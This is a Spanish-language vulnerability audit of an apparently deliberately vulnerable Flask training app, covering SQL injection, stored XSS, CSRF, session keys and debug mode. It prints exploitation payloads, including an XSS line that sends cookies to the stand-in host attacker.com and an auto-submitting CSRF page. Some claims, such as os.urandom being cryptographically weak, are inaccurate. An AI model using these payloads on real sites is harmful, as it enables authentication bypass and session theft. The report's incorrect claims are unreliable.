# Análisis de Vulnerabilidades - Código Fuente
**Auditor:** David H. Cuevas Salgado  
**Fecha:** 29/11/2025 00:41  
**Aplicación:** Flask Vulnerable Web Application  
**Archivo Analizado:** vulnerable_flask_app.py

---

## VULNERABILIDAD 1: SQL INJECTION (CRÍTICA)

### Ubicación
- **Archivo:** vulnerable_flask_app.py  
- **Líneas:** 46-50  
- **Función:** login()

### Código Vulnerable
\\\python
if "' OR '" in password:
    query = "SELECT * FROM users WHERE username = '{}' AND password = '{}'".format(
        username, password)
    user = conn.execute(query).fetchone()
\\\

### Descripción Técnica
La aplicación construye una query SQL mediante concatenación de strings utilizando .format(). Aunque existe una validación condicional que detecta el patrón "' OR '", esta validación es fácilmente bypasseable y la lógica sigue siendo vulnerable.

### Causa Raíz
- Concatenación directa de input del usuario en queries SQL
- Falta de uso de consultas parametrizadas
- Validación basada en blacklist en lugar de whitelist
- No se utiliza ORM ni prepared statements

### Impacto
- **Confidencialidad:** ALTA - Acceso no autorizado a datos
- **Integridad:** ALTA - Modificación de datos
- **Disponibilidad:** MEDIA - Posible DoS mediante queries maliciosas
- **Bypass completo de autenticación**
- **Acceso a cualquier cuenta sin conocer credenciales**

### Clasificación
- **CVSS 3.1:** 9.8 (Critical)
- **CWE:** CWE-89 (SQL Injection)
- **OWASP Top 10:** A03:2021 - Injection

### Payload de Explotación
\\\
username: admin
password: ' OR '1'='1
\\\

---

## VULNERABILIDAD 2: STORED CROSS-SITE SCRIPTING - XSS (ALTA)

### Ubicación
- **Archivo:** vulnerable_flask_app.py  
- **Líneas:** 110-114 (dashboard template)  
- **Función:** dashboard()

### Código Vulnerable
\\\python
{% for comment in comments %}
    <li class="list-group-item">{{ comment['comment'] }}</li>
{% endfor %}
\\\

### Descripción Técnica
Los comentarios almacenados en la base de datos se renderizan directamente en el HTML sin sanitización ni escape. Flask/Jinja2 tiene auto-escaping habilitado por defecto SOLO para archivos .html, pero al usar render_template_string(), el auto-escaping NO está activo.

### Causa Raíz
- Uso de render_template_string() en lugar de archivos template separados
- No se aplica escape manual al contenido generado por usuarios
- Falta de validación del input en submit_comment()
- No hay Content Security Policy (CSP) headers

### Impacto
- **Confidencialidad:** ALTA - Robo de cookies de sesión
- **Integridad:** ALTA - Modificación del DOM, phishing
- **Disponibilidad:** BAJA - Posible redirección a sitios maliciosos
- **Ejecución de JavaScript arbitrario en contexto de otros usuarios**
- **Robo de tokens de sesión**
- **Keylogging en el navegador**

### Clasificación
- **CVSS 3.1:** 7.5 (High)
- **CWE:** CWE-79 (Cross-site Scripting)
- **OWASP Top 10:** A03:2021 - Injection

### Payload de Explotación
\\\html
<script>alert('XSS Vulnerability')</script>
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
<img src=x onerror="alert('XSS')">
\\\

---

## VULNERABILIDAD 3: CROSS-SITE REQUEST FORGERY - CSRF (MEDIA)

### Ubicación
- **Archivo:** vulnerable_flask_app.py  
- **Líneas:** Todos los formularios (login, submit_comment)  
- **Funciones:** login(), submit_comment()

### Código Vulnerable
\\\python
# Formulario sin protección CSRF
<form method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">Login</button>
</form>
# No hay token CSRF validation
\\\

### Descripción Técnica
La aplicación no implementa tokens anti-CSRF en ningún formulario. Flask proporciona Flask-WTF para protección CSRF, pero no está siendo utilizado. Cualquier sitio externo puede forzar al navegador del usuario a enviar peticiones POST autenticadas.

### Causa Raíz
- No se utiliza Flask-WTF ni ninguna protección CSRF
- No se valida el origen de las peticiones
- Cookies sin atributo SameSite
- Falta de validación de headers (Origin, Referer)

### Impacto
- **Confidencialidad:** BAJA
- **Integridad:** ALTA - Acciones no autorizadas
- **Disponibilidad:** BAJA
- **Publicación de comentarios maliciosos sin consentimiento**
- **Cambio de configuración de cuenta**
- **Acciones administrativas si el usuario es admin**

### Clasificación
- **CVSS 3.1:** 6.5 (Medium)
- **CWE:** CWE-352 (Cross-Site Request Forgery)
- **OWASP Top 10:** A01:2021 - Broken Access Control

### Payload de Explotación
\\\html
<!-- Página maliciosa externa -->
<html>
<body>
<form action="http://localhost:5000/submit_comment" method="POST" id="csrf">
    <input type="hidden" name="comment" value="Mensaje inyectado por CSRF">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
\\\

---

## VULNERABILIDAD 4: GESTIÓN INSEGURA DE SESIONES (MEDIA)

### Ubicación
- **Archivo:** vulnerable_flask_app.py  
- **Línea:** 11  
- **Configuración global:** app.secret_key

### Código Vulnerable
\\\python
app.secret_key = os.urandom(24)
\\\

### Descripción Técnica
La secret_key se genera aleatoriamente cada vez que la aplicación se inicia usando os.urandom(24). Esto causa que todas las sesiones existentes se invaliden al reiniciar la aplicación. Además, la key no es criptográficamente segura para producción.

### Causa Raíz
- Secret key no persistente (regenerada en cada inicio)
- No se almacena en variable de entorno
- Longitud insuficiente para producción
- Falta de rotación controlada de keys
- No hay configuración de timeout de sesión

### Impacto
- **Confidencialidad:** MEDIA - Posible predicción de tokens
- **Integridad:** MEDIA - Sesiones inválidas
- **Disponibilidad:** ALTA - Logout forzado al reiniciar
- **Pérdida de sesiones de usuarios al reiniciar servidor**
- **Dificultad para debugging de sesiones**
- **Posible vulnerabilidad si se puede predecir el seed**

### Clasificación
- **CVSS 3.1:** 5.3 (Medium)
- **CWE:** CWE-330 (Use of Insufficiently Random Values)
- **OWASP Top 10:** A02:2021 - Cryptographic Failures

### Evidencia del Problema
\\\ash
# Iniciar app → Login exitoso → Reiniciar app → Sesión inválida
docker-compose restart
# Usuario será deslogueado
\\\

---

## VULNERABILIDAD 5: INFORMACIÓN SENSIBLE EXPUESTA - DEBUG MODE (MEDIA)

### Ubicación
- **Archivo:** vulnerable_flask_app.py  
- **Línea:** 145  
- **Función:** Configuración de ejecución

### Código Vulnerable
\\\python
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
\\\

### Descripción Técnica
La aplicación se ejecuta con debug=True activado. En modo debug, Flask expone el debugger interactivo de Werkzeug, stack traces completos, variables de entorno, rutas del sistema de archivos, y un console interactivo accesible desde el navegador.

### Causa Raíz
- Debug mode habilitado en código (hardcoded)
- No se usa variable de entorno FLASK_ENV
- Falta de separación entre configuración dev/prod
- No hay manejo de errores personalizado

### Impacto
- **Confidencialidad:** ALTA - Exposición de código fuente y variables
- **Integridad:** MEDIA - Consola interactiva accesible
- **Disponibilidad:** BAJA
- **Stack traces revelan estructura de código**
- **Rutas absolutas del servidor expuestas**
- **Posible ejecución remota de código mediante debugger**
- **Variables de entorno visibles**

### Clasificación
- **CVSS 3.1:** 5.0 (Medium)
- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **OWASP Top 10:** A05:2021 - Security Misconfiguration

### Evidencia de Explotación
\\\
# Forzar un error 500 para ver stack trace
GET /ruta-inexistente HTTP/1.1
# Respuesta incluirá código fuente completo y rutas del servidor
\\\

---

## RESUMEN EJECUTIVO

### Distribución por Severidad

| Severidad   | Cantidad |     Vulnerabilidades       |
|-------------|----------|----------------------------|
| **Crítica** |     1    |       SQL Injection        |
| **Alta**    |     1    |        Stored XSS          |
| **Media**   |     3    | CSRF, Sesiones, Debug Mode |
| **TOTAL**   |   **5**  |                            |

### Top 5 Vulnerabilidades Priorizadas para Explotación

1. **SQL Injection** - Bypass de autenticación (Crítica)
2. **Stored XSS** - Ejecución de scripts (Alta)
3. **CSRF** - Acciones no autorizadas (Media)
4. **Gestión de Sesiones** - Invalidación de sesiones (Media)
5. **Debug Mode** - Exposición de información (Media)

### Metodología de Análisis
- Revisión manual de código fuente
- Análisis estático de seguridad
- Identificación de patrones OWASP Top 10
- Clasificación según CVSS 3.1
- Mapeo a CWE (Common Weakness Enumeration)

---

**Próximo paso:** Explotación práctica de las 5 vulnerabilidades priorizadas con evidencia completa (Fase 3).

**Fecha de análisis:** 29/11/2025 00:41  
**Analista:** DAVID H. CUEVAS SALGADO

